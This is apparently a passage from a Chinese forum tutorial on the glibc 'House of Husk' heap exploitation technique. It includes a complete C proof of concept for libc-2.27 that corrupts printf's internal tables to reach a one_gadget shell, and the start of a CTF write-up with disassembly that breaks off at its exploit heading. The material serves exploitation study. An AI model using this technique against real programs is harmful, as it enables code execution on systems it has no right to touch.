
```
      || __printf_arginfo_table[spec->info.spec] == NULL

      /* We don't try to get the types for all arguments if the format
     uses more than one.  The normal case is covered though.  If
     the call returns -1 we continue with the normal specifiers.  */

      || (int) (spec->ndata_args = (*__printf_arginfo_table[spec->info.spec])
                   (&spec->info, 1, &spec->data_arg_type,
                    &spec->size))
```

- 泄露 `libc` 地址。
- 修改 `global_max_fast` 为很大的值，可以 large bin attack/unsorted bin attack
- 将 `__printf_function_table` 或者 `__printf_arginfo_table` 覆盖为指向写有 `one_gadget` 的内存的指针。其中 `one_gadget` 在内存中的偏移对应与之后触发漏洞的 `spec`。
- 如果是利用 `__printf_function_table` 触发漏洞需要让 `__printf_arginfo_table` 指向一块内存并且该内存对应 `spec` 偏移处设为 `null`，否则会在 `__parse_one_specmb` 函数的 `if` 判断中造成不可预知的错误。
- 最后调用 `printf` 触发漏洞获取 shell。

4. [//ptr-yudai.hatenablog.com/entry/2020/04/02/013910](https://ptr-yudai.hatenablog.com/entry/2020/04/02/013910)

## PoC

```
/*
 * This is a Proof-of-Concept for House of Husk
 * This PoC is supposed to be run with libc-2.27.
 gcc poc.c -o poc -no-pie -g
 */
#include 
#include 

#define offset2size(ofs) ((ofs) * 2 - 0x10)
#define MAIN_ARENA       0x3ebc40
#define MAIN_ARENA_DELTA 0x60
#define GLOBAL_MAX_FAST  0x3ed940
#define PRINTF_FUNCTABLE 0x3f0738
#define PRINTF_ARGINFO   0x3ec870
#define ONE_GADGET       0x10a2fc

int main (void)
{
    unsigned long libc_base;
    char *a[10];
    setbuf(stdout, NULL); // make printf quiet

    /* leak libc */
    a[0] = malloc(0x500); /* UAF chunk */
    a[1] = malloc(offset2size(PRINTF_FUNCTABLE - MAIN_ARENA));
    a[2] = malloc(offset2size(PRINTF_ARGINFO - MAIN_ARENA));
    a[3] = malloc(0x500); /* avoid consolidation */
    free(a[0]);
    // unsorted bin 泄露 libc
    libc_base = *(unsigned long*)a[0] - MAIN_ARENA - MAIN_ARENA_DELTA;
    printf("libc @ 0x%lx\n", libc_base);

    /* prepare fake printf arginfo table */
    /* 'X'-2 mean that prev_size | size */
    *(unsigned long*)(a[2] + ('X' - 2) * 8) = libc_base + ONE_GADGET;
    // now __printf_arginfo_table['X'] = one_gadget;
    /*(unsigned long*)(a[1] + ('X' - 2) * 8) = libc_base + ONE_GADGET; */
    /* unsorted bin attack */
    *(unsigned long*)(a[0] + 8) = libc_base + GLOBAL_MAX_FAST - 0x10;
    a[0] = malloc(0x500); /* overwrite global_max_fast */

    /* overwrite __printf_arginfo_table and __printf_function_table */
    free(a[1]);// __printf_function_table => a heap_addr which is not NULL
    free(a[2]);// => one_gadget

    /* ignite! */
    printf("%X", 0);

    return 0;
}
```

![](https://attach.52pojie.cn/forum/202310/30/170801do6b1456oxboodg6.png)

`image-20231024120231850.png` (32.64 KB, 下载次数: 4)

[附件](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjY1MjYwMnxhNTliYTQ5NXwxNzkzNTczMDQwfDE2ODA4NnwxODUwNDcw&nothumb=yes)

43

2023-10-30 17:08 上传

3. [//github.com/firmianay/CTF-All-In-One/tree/master/src/writeup/6.1.13_pwn_34c3ctf2017_readme_revenge](https://github.com/firmianay/CTF-All-In-One/tree/master/src/writeup/6.1.13_pwn_34c3ctf2017_readme_revenge)

## 检查信息

![](https://attach.52pojie.cn/forum/202310/30/170824bbuul9nz3yy99lts.png)

`image-20231024113648875.png` (95.83 KB, 下载次数: 2)

[附件](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjY1MjYwM3w2YTkzNDU0OXwxNzkzNTczMDQwfDE2ODA4NnwxODUwNDcw&nothumb=yes)

44

2023-10-30 17:08 上传

![](https://attach.52pojie.cn/forum/202310/30/170847xg62hb7yj7w6uvhl.png)

`image-20231024113706190.png` (65.88 KB, 下载次数: 4)

[附件](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjY1MjYwNHxkYjQ2Y2VmNnwxNzkzNTczMDQwfDE2ODA4NnwxODUwNDcw&nothumb=yes)

45

2023-10-30 17:08 上传

静态编译并且没有去除符号。

## 试运行

![](https://attach.52pojie.cn/forum/202310/30/170921x89zenpiiynno9op.png)

`image-20231024113820842.png` (26.5 KB, 下载次数: 2)

[附件](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjY1MjYwNXxmMWI1OGI5OHwxNzkzNTczMDQwfDE2ODA4NnwxODUwNDcw&nothumb=yes)

46

2023-10-30 17:09 上传

## 逆向分析

```
.text:0000000000400A0D                               ; int __cdecl main(int argc, const char **argv, const char **envp)
.text:0000000000400A0D                               public main
.text:0000000000400A0D                               main proc near                          ; DATA XREF: _start+1D↑o
.text:0000000000400A0D
.text:0000000000400A0D                               var_1020= qword ptr -1020h
.text:0000000000400A0D
.text:0000000000400A0D                               ; __unwind {
.text:0000000000400A0D 55                            push    rbp
.text:0000000000400A0E 48 89 E5                      mov     rbp, rsp
.text:0000000000400A11 48 8D A4 24 E0 EF FF FF       lea     rsp, [rsp-1020h]
.text:0000000000400A19 48 83 0C 24 00                or      [rsp+1020h+var_1020], 0
.text:0000000000400A1E 48 8D A4 24 20 10 00 00       lea     rsp, [rsp+1020h]
.text:0000000000400A26 48 8D 35 B3 69 2B 00          lea     rsi, name
.text:0000000000400A2D 48 8D 3D 50 C7 08 00          lea     rdi, unk_48D184    ;%s
.text:0000000000400A34 B8 00 00 00 00                mov     eax, 0
.text:0000000000400A39 E8 22 71 00 00                call    __isoc99_scanf
.text:0000000000400A39
.text:0000000000400A3E 48 8D 35 9B 69 2B 00          lea     rsi, name
.text:0000000000400A45 48 8D 3D 3B C7 08 00          lea     rdi, aHiSBye                    ; "Hi, %s. Bye.\n"
.text:0000000000400A4C B8 00 00 00 00                mov     eax, 0
.text:0000000000400A51 E8 7A 6F 00 00                call    printf
.text:0000000000400A51
.text:0000000000400A56 B8 00 00 00 00                mov     eax, 0
.text:0000000000400A5B 5D                            pop     rbp
.text:0000000000400A5C C3                            retn
.text:0000000000400A5C                               ; } // starts at 400A0D
.text:0000000000400A5C
.text:0000000000400A5C                               main endp
```

![](https://attach.52pojie.cn/forum/202310/30/171000fvvkesw5zesxqbsa.png)

`image-20231024114633005.png` (163.96 KB, 下载次数: 1)

[附件](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjY1MjYwNnw3MjgyMTZjNnwxNzkzNTczMDQwfDE2ODA4NnwxODUwNDcw&nothumb=yes)

47

2023-10-30 17:10 上传

存在缓冲区漏洞，向 `.bss` 节的 `name` 变量写入内容，然后打印它。并且 `flag` 位于 `.data` 节，可以利用 `__stack_chk_fail()` 将其打印出来。

## 漏洞利用

利用缓冲区溢出篡改 `__printf_function_table` 指向一个非零值，因为 `%s` 的 ascii 是 `0x73`，所以让 `__printf_arginfo_table` 指向 `fake_arginfo_table[0x73*8] == __stack_chk_fail()`，将 `argv[0]` 改为 `flag` 地址。

![](https://attach.52pojie.cn/forum/202310/30/171022v8j7tp747w8ssi11.png)

`image-20231024115056364.png` (47.06 KB, 下载次数: 2)

[附件](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjY1MjYwN3wyNDZmNjg2OXwxNzkzNTczMDQwfDE2ODA4NnwxODUwNDcw&nothumb=yes)

48

2023-10-30 17:10 上传

![](https://attach.52pojie.cn/forum/202310/30/171040sptky7q1uyzgngun.png)

`image-20231024115137320.png` (35.91 KB, 下载次数: 2)

[附件](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjY1MjYwOHxiNzE2ZjY5MXwxNzkzNTczMDQwfDE2ODA4NnwxODUwNDcw&nothumb=yes)

49

2023-10-30 17:10 上传

## exp
